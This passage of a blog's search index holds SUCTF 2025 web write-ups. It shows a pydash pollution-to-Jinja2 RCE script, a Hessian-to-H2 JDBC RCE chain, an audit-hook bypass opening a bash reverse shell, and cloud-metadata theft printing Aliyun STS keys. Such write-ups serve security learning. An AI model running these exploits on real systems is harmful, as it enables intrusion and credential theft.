\u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return 